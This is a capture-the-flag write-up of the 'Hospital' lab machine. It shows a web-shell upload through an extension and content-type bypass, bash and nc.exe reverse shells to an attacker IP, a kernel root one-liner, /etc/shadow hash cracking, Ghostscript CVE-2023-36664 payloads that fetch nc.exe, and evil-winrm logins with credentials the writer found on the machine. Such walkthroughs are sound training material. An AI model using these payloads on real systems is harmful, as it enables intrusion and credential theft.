# Writeup: Hospital

# Enumeration

>We'll start with a port scan using the automatic TCP port scan script I've created:

```bash
┌──(kali㉿jbkira)-[~/Desktop/machines/Hostpital]
└─$ sudo AutoNmap.sh 10.129.166.40 
AutoNmap By JBKira
Puertos TCP abiertos:
53,88,135,139,389,443,445,464,593,636,1801,2103,2105,2107,2179,3268,3269,3389,5985,6033,6404,6406,6407,6409,6612,6628,9389
53/tcp   open  domain            Simple DNS Plus
88/tcp   open  kerberos-sec      Microsoft Windows Kerberos (server time: 2025-04-16 23:49:37Z)
135/tcp  open  msrpc             Microsoft Windows RPC
139/tcp  open  netbios-ssn       Microsoft Windows netbios-ssn
389/tcp  open  ldap              Microsoft Windows Active Directory LDAP (Domain: hospital.htb0., Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=DC
| Subject Alternative Name: DNS:DC, DNS:DC.hospital.htb
| Issuer: commonName=DC
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2023-09-06T10:49:03
| Not valid after:  2028-09-06T10:49:03
| MD5:   04b1:adfe:746a:788e:36c0:802a:bdf3:3119
|_SHA-1: 17e5:8592:278f:4e8f:8ce1:554c:3550:9c02:2825:91e3
443/tcp  open  ssl/http          Apache httpd 2.4.56 ((Win64) OpenSSL/1.1.1t PHP/8.0.28)
| tls-alpn: 
|_  http/1.1
|_ssl-date: TLS randomness does not represent time
|_http-server-header: Apache/2.4.56 (Win64) OpenSSL/1.1.1t PHP/8.0.28
|_http-title: Hospital Webmail :: Welcome to Hospital Webmail
|_http-favicon: Unknown favicon MD5: 924A68D347C80D0E502157E83812BB23
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
| ssl-cert: Subject: commonName=localhost
| Issuer: commonName=localhost
| Public Key type: rsa
| Public Key bits: 1024
| Signature Algorithm: sha1WithRSAEncryption
| Not valid before: 2009-11-10T23:48:47
| Not valid after:  2019-11-08T23:48:47
| MD5:   a0a4:4cc9:9e84:b26f:9e63:9f9e:d229:dee0
|_SHA-1: b023:8c54:7a90:5bfa:119c:4e8b:acca:eacf:3649:1ff6
445/tcp  open  microsoft-ds?
464/tcp  open  kpasswd5?
593/tcp  open  ncacn_http        Microsoft Windows RPC over HTTP 1.0
636/tcp  open  ldapssl?
| ssl-cert: Subject: commonName=DC
| Subject Alternative Name: DNS:DC, DNS:DC.hospital.htb
| Issuer: commonName=DC
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2023-09-06T10:49:03
| Not valid after:  2028-09-06T10:49:03
| MD5:   04b1:adfe:746a:788e:36c0:802a:bdf3:3119
|_SHA-1: 17e5:8592:278f:4e8f:8ce1:554c:3550:9c02:2825:91e3
1801/tcp open  msmq?
2103/tcp open  msrpc             Microsoft Windows RPC
2105/tcp open  msrpc             Microsoft Windows RPC
2107/tcp open  msrpc             Microsoft Windows RPC
2179/tcp open  vmrdp?
3268/tcp open  ldap              Microsoft Windows Active Directory LDAP (Domain: hospital.htb0., Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=DC
| Subject Alternative Name: DNS:DC, DNS:DC.hospital.htb
| Issuer: commonName=DC
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2023-09-06T10:49:03
| Not valid after:  2028-09-06T10:49:03
| MD5:   04b1:adfe:746a:788e:36c0:802a:bdf3:3119
|_SHA-1: 17e5:8592:278f:4e8f:8ce1:554c:3550:9c02:2825:91e3
3269/tcp open  globalcatLDAPssl?
| ssl-cert: Subject: commonName=DC
| Subject Alternative Name: DNS:DC, DNS:DC.hospital.htb
| Issuer: commonName=DC
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2023-09-06T10:49:03
| Not valid after:  2028-09-06T10:49:03
| MD5:   04b1:adfe:746a:788e:36c0:802a:bdf3:3119
|_SHA-1: 17e5:8592:278f:4e8f:8ce1:554c:3550:9c02:2825:91e3
3389/tcp open  ms-wbt-server     Microsoft Terminal Services
| rdp-ntlm-info: 
|   Target_Name: HOSPITAL
|   NetBIOS_Domain_Name: HOSPITAL
|   NetBIOS_Computer_Name: DC
|   DNS_Domain_Name: hospital.htb
|   DNS_Computer_Name: DC.hospital.htb
|   DNS_Tree_Name: hospital.htb
|   Product_Version: 10.0.17763
|_  System_Time: 2025-04-16T23:50:32+00:00
| ssl-cert: Subject: commonName=DC.hospital.htb
| Issuer: commonName=DC.hospital.htb
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2025-04-15T23:46:55
| Not valid after:  2025-10-15T23:46:55
| MD5:   eee2:e34c:e7c8:e180:3446:1ad7:444b:b711
|_SHA-1: 6a5f:b295:133f:503e:3360:6798:e914:dadd:0b40:cae2
5985/tcp open  http              Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
6033/tcp open  msrpc             Microsoft Windows RPC
6404/tcp open  msrpc             Microsoft Windows RPC
6406/tcp open  ncacn_http        Microsoft Windows RPC over HTTP 1.0
6407/tcp open  msrpc             Microsoft Windows RPC
6409/tcp open  msrpc             Microsoft Windows RPC
6612/tcp open  msrpc             Microsoft Windows RPC
6628/tcp open  msrpc             Microsoft Windows RPC
9389/tcp open  mc-nmf            .NET Message Framing
| smb2-time: 
|   date: 2025-04-16T23:50:35
|_  start_date: N/A
|_clock-skew: mean: 7h00m00s, deviation: 0s, median: 6h59m59s
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled and required
```

>We list the Windows version and the domain name using the crackmapexec tool:

```bash
┌──(kali㉿jbkira)-[~]
└─$ crackmapexec smb 10.129.166.40 2>/dev/null
SMB         10.129.166.40   445    DC               [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC) (domain:hospital.htb) (signing:True) (SMBv1:False)
```

>On port 443, we can see a RoundCube service running:

![image](https://github.com/user-attachments/assets/3dc6e1b4-bfcc-4ac0-a3c4-db1e0254c8d7)

>If we go to the web app hosted on port 8080, we can see a website that allows users to register:

![image](https://github.com/user-attachments/assets/60febac9-56f0-4c15-b122-5f23388e6ba7)

>Once we have created our account and logged in, we will see a form for uploading files:

![image](https://github.com/user-attachments/assets/6e583142-06fd-478e-ad80-014fdf5cb69b)

>We're going to use the following web shell: https://github.com/flozz/p0wny-shell/blob/master/shell.php

>We open BurpSuite and intercept the file upload in case we need to bypass any rules:

```bash
burpsuite &>/dev/null & disown
```

>Uploading the shell without using evasion techniques results in an error:

![image](https://github.com/user-attachments/assets/d7749916-a2cd-424a-8453-f31e624e5699)

>If we change the file extension to .phar and the content-type to image/png, it allows us to upload the shell:

![image](https://github.com/user-attachments/assets/4788c734-d728-4300-af72-94bfb8ae5f52)

>We discovered that the file is located in the uploads/ directory and that the name of the uploaded file remains unchanged, so we can execute commands in our web shell:

![image](https://github.com/user-attachments/assets/a62079ea-ec49-4160-855e-41a67a7325ea)

>Let's create a reverse shell to give us a shell on our attacker's machine:

```bash
bash -c "bash -i >& /dev/tcp/10.10.14.133/443 0>&1"
```

>We create a listener and receive the shell:

```bash
┌──(kali㉿jbkira)-[~/Desktop/machines/Hostpital]
└─$ sudo nc -nlvp 443
listening on [any] 443 ...
connect to [10.10.14.133] from (UNKNOWN) [10.129.166.40] 6608
bash: cannot set terminal process group (978): Inappropriate ioctl for device
bash: no job control in this shell
www-data@webserver:/var/www/html/uploads$ 
```

>We switch the shell to a full TTY:

```bash
script -c bash /dev/null
Ctrl+Z
stty size
stty -echo raw; fg
reset xterm
export TERM=xterm
export SHELL=bash
stty rows 38 columns 172

www-data@webserver:/var/www/html/uploads$ tty
/dev/pts/0
```

# Privilege Escalation (Linux)

>If we check the kernel version, we can see that it is vulnerable:

```bash
www-data@webserver:/home$ uname -a
Linux webserver 5.19.0-35-generic #36-Ubuntu SMP PREEMPT_DYNAMIC Fri Feb 3 18:36:56 UTC 2023 x86_64 x86_64 x86_64 GNU/Linux
```

>With the following one-liner, we can gain a root shell:

```bash
www-data@webserver:/tmp$ unshare -rm sh -c "mkdir l u w m && cp /u*/b*/p*3 l/;setcap cap_setuid+eip l/python3;mount -t overlay overlay -o rw,lowerdir=l,upperdir=u,workdir=w m && touch m/*;" && u/python3 -c 'import os;os.setuid(0);os.system("cp /bin/bash /var/tmp/bash && chmod 4755 /var/tmp/bash && /var/tmp/bash -p && rm -rf l m u w /var/tmp/bash")'
mkdir: cannot create directory 'l': File exists
mkdir: cannot create directory 'u': File exists
mkdir: cannot create directory 'w': File exists
mkdir: cannot create directory 'm': File exists
root@webserver:/tmp#
```

>If we open the /etc/shadow file, we can see that a user has an SHA512crypt hash, which we are going to crack:

```bash
root@webserver:/root# cat /etc/shadow
root:$y$j9T$s/Aqv48x449udndpLC6eC.$WUkrXgkW46N4xdpnhMoax7US.JgyJSeobZ1dzDs..dD:19612:0:99999:7:::
<SNIP>
drwilliams:$6$uWBSeTcoXXTBRkiL$S9ipksJfiZuO4bFI6I9w/iItu5.Ohoz3dABeF6QWumGBspUW378P1tlwak7NqzouoRTbrz6Ag0qcyGQxW192y/:19612:0:99999:7:::
<SNIP>
```

>Let's crack it with John, using rockyou.txt as the wordlist:

```bash
┌──(kali㉿jbkira)-[~/Desktop/machines/Hostpital]
└─$ john -w=/usr/share/wordlists/rockyou.txt hash
Using default input encoding: UTF-8
Loaded 1 password hash (sha512crypt, crypt(3) $6$ [SHA512 128/128 AVX 2x])
Cost 1 (iteration count) is 5000 for all loaded hashes
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
qwe123!@#        (?)     
1g 0:00:01:06 DONE (2025-04-16 13:57) 0.01511g/s 3238p/s 3238c/s 3238C/s raycharles..pucci
Use the "--show" option to display all of the cracked passwords reliably
Session completed. 

```

# Lateral Movement

>We can use these credentials with the service running on port 443:

![image](https://github.com/user-attachments/assets/75bbee70-ea04-45af-9b76-2be4b1062394)

>Here we can see that we are asked to provide an .eps file that is compatible with GhostScript; we can exploit this to gain greater access to the system. In this case, we will exploit the CVE-2023–36664 vulnerability, which allows command execution in GhostScript, using the following exploit: https://github.com/jakabakos/CVE-2023-36664-Ghostscript-command-injection

>We create a file so that they can download nc.exe from our attacker machine:

```bash
┌──(kali㉿jbkira)-[~/Desktop/machines/Hostpital/CVE-2023-36664-Ghostscript-command-injection]
└─$ python3 CVE_2023_36664_exploit.py --inject --payload "curl http://10.10.14.133:80/nc.exe -o nc.exe" --filename file.eps
[+] Payload successfully injected into file.eps.
```

>We've uploaded it to drbrown:

![image](https://github.com/user-attachments/assets/3fc600fb-b44a-41b4-93ea-30cbb72f3c6b)

>Now let's create another .eps file that runs nc.exe and sends us a reverse shell:

```bash
┌──(kali㉿jbkira)-[~/Desktop/machines/Hostpital/CVE-2023-36664-Ghostscript-command-injection]
└─$ python3 CVE_2023_36664_exploit.py --inject --payload "nc.exe 10.10.14.133 8888 -e cmd.exe" --filename file.eps
[+] Payload successfully injected into file.eps.

```

>We send it to him again and set up the listener:

```bash
┌──(kali㉿jbkira)-[~/Desktop/academy_tools]
└─$ nc -nlvp 8888 
listening on [any] 8888 ...
connect to [10.10.14.133] from (UNKNOWN) [10.129.166.40] 21804
Microsoft Windows [Version 10.0.17763.4974]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\Users\drbrown.HOSPITAL\Documents>
```

# Privilege Escalation Windows

>On his desk, we can see the file user.txt:

```powershell
C:\Users\drbrown.HOSPITAL\Desktop>dir
dir
 Volume in drive C has no label.
 Volume Serial Number is 7357-966F

 Directory of C:\Users\drbrown.HOSPITAL\Desktop

10/27/2023  12:24 AM    <DIR>          .
10/27/2023  12:24 AM    <DIR>          ..
04/16/2025  04:48 PM                34 user.txt
               1 File(s)             34 bytes
               2 Dir(s)   4,187,254,784 bytes free

```

>In the documents directory, we can see a script containing credentials:

```powershell
C:\Users\drbrown.HOSPITAL\Documents>type ghostscript.bat
type ghostscript.bat
@echo off
set filename=%~1
powershell -command "$p = convertto-securestring 'chr!$br0wn' -asplain -force;$c = new-object system.management.automation.pscredential('hospital\drbrown', $p);Invoke-Command -ComputerName dc -Credential $c -ScriptBlock { cmd.exe /c "C:\Program` Files\gs\gs10.01.1\bin\gswin64c.exe" -dNOSAFER "C:\Users\drbrown.HOSPITAL\Downloads\%filename%" }"
```

>If we test the credentials, we can see that they are valid for the user drbrown:

```bash
┌──(kali㉿jbkira)-[~]
└─$ crackmapexec smb 10.129.166.40 -u 'drbrown' -p 'chr!$br0wn' 2>/dev/null
SMB         10.129.166.40   445    DC               [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC) (domain:hospital.htb) (signing:True) (SMBv1:False)
SMB         10.129.166.40   445    DC               [+] hospital.htb\drbrown:chr!$br0wn
```

>We can see that this user belongs to the Remote Management Users group, so we can use evil-winrm to log in as them on the DC:

```bash
┌──(kali㉿jbkira)-[~]
└─$ crackmapexec winrm 10.129.166.40 -u 'drbrown' -p 'chr!$br0wn' 2>/dev/null 
SMB         10.129.166.40   5985   DC               [*] Windows 10 / Server 2019 Build 17763 (name:DC) (domain:hospital.htb)
HTTP        10.129.166.40   5985   DC               [*] http://10.129.166.40:5985/wsman
WINRM       10.129.166.40   5985   DC               [+] hospital.htb\drbrown:chr!$br0wn (Pwn3d!)
```

```bash
┌──(kali㉿jbkira)-[~]
└─$ evil-winrm -i 10.129.166.40 -u 'drbrown' -p 'chr!$br0wn'         
<SNIP>
*Evil-WinRM* PS C:\Users\drbrown.HOSPITAL\Documents> 
```

>Now we’re going to try to gain access to the user running XAMPP, so we’re going to upload the same webshell as before to the C:\XAMPP\htdocs directory:

```powershell
*Evil-WinRM* PS C:\XAMPP\htdocs> upload /home/kali/Desktop/machines/Hostpital/webshell.php
                                        
Info: Uploading /home/kali/Desktop/machines/Hostpital/webshell.php to C:\XAMPP\htdocs\webshell.php
                                        
Data: 27092 bytes of 27092 bytes copied
                                        
Info: Upload successful!

```

>When we accessed the webshell, we were surprised to find that we had a shell with privileges such as NT AUTHORITY\SYSTEM, so we simply set up a reverse shell using nc.exe, which we had already uploaded previously:

![image](https://github.com/user-attachments/assets/34e3f597-0535-4f29-9b56-028ade7873e4)


>And here we can already see the flag root.txt:

```powershell
PS C:\xampp\htdocs> cd C:\Users\Administrator\Desktop
cd C:\Users\Administrator\Desktop
PS C:\Users\Administrator\Desktop> dir
dir


    Directory: C:\Users\Administrator\Desktop


Mode                LastWriteTime         Length Name                                                                  
----                -------------         ------ ----                                                                  
-ar---        4/16/2025   4:48 PM             34 root.txt 
```
